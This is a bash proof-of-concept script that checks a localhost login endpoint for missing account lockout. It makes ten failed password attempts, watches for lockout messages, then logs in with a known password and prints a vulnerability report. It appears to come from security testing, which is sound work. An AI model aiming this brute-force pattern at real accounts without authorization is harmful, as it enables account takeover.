#!/bin/bash

# POC: Missing Account Lockout Mechanism Allows Unlimited Brute Force Attempts
# This script demonstrates that unlimited password attempts can be made without any lockout

TARGET="http://localhost:8082"
USERNAME="test"
USER_ID="10032"
CORRECT_PASSWORD="test"
FAILED_ATTEMPTS=10

echo "=========================================="
echo "POC: No Account Lockout - Brute Force Attack"
echo "=========================================="
echo ""
echo "Target: $TARGET"
echo "Username: $USERNAME"
echo "Testing $FAILED_ATTEMPTS failed attempts followed by successful login"
echo ""

# Track timing to detect any progressive delays
START_TIME=$(date +%s)

# Attempt multiple failed logins
echo "[*] Attempting $FAILED_ATTEMPTS failed login attempts..."
for i in $(seq 1 $FAILED_ATTEMPTS); do
    ATTEMPT_START=$(date +%s%3N)
    
    RESPONSE=$(curl -s -w "\nHTTP_CODE:%{http_code}\n" -X POST \
        "$TARGET/password/$USERNAME" \
        -d "username=$USERNAME&user_id=$USER_ID&password=wrongpass$i" \
        -L)
    
    ATTEMPT_END=$(date +%s%3N)
    ATTEMPT_TIME=$((ATTEMPT_END - ATTEMPT_START))
    
    HTTP_CODE=$(echo "$RESPONSE" | grep "HTTP_CODE" | cut -d: -f2)
    
    echo "  Attempt $i: HTTP $HTTP_CODE (Response time: ${ATTEMPT_TIME}ms)"
    
    # Check if account got locked
    if echo "$RESPONSE" | grep -qi "locked\|blocked\|too many"; then
        echo ""
        echo "[!] Account lockout detected after $i attempts!"
        echo "[+] Application HAS account lockout protection"
        exit 0
    fi
    
    # Small delay to avoid overwhelming the server
    sleep 0.1
done

FAILED_TIME=$(date +%s)
FAILED_DURATION=$((FAILED_TIME - START_TIME))

echo ""
echo "[*] Completed $FAILED_ATTEMPTS failed attempts in ${FAILED_DURATION} seconds"
echo "[*] No account lockout detected"
echo ""

# Now attempt login with correct password
echo "[*] Attempting login with CORRECT password after $FAILED_ATTEMPTS failed attempts..."
RESPONSE=$(curl -s -i -X POST \
    "$TARGET/password/$USERNAME" \
    -d "username=$USERNAME&user_id=$USER_ID&password=$CORRECT_PASSWORD")

HTTP_CODE=$(echo "$RESPONSE" | grep "HTTP/" | head -1 | awk '{print $2}')
LOCATION=$(echo "$RESPONSE" | grep -i "^Location:" | cut -d' ' -f2 | tr -d '\r')
SESSION_COOKIE=$(echo "$RESPONSE" | grep -i "^Set-Cookie: session=" | cut -d' ' -f2 | cut -d';' -f1 | tr -d '\r')

echo ""
echo "Response:"
echo "  HTTP Status: $HTTP_CODE"
echo "  Location: $LOCATION"
echo "  Session Cookie: $SESSION_COOKIE"
echo ""

# Verify successful authentication
if [ "$HTTP_CODE" = "302" ] && echo "$LOCATION" | grep -q "dashboard"; then
    echo "=========================================="
    echo "[VULNERABLE] Authentication succeeded immediately!"
    echo "=========================================="
    echo ""
    echo "PROOF OF VULNERABILITY:"
    echo "  ✗ No account lockout after $FAILED_ATTEMPTS failed attempts"
    echo "  ✗ No progressive delays detected"
    echo "  ✗ No CAPTCHA required"
    echo "  ✗ No additional verification needed"
    echo "  ✓ Correct password accepted immediately"
    echo ""
    echo "IMPACT: Unlimited brute force attacks possible"
    echo "An attacker can attempt thousands of passwords without restriction."
    exit 0
else
    echo "[?] Unexpected response - authentication may have failed"
    echo "Full response:"
    echo "$RESPONSE"
    exit 1
fi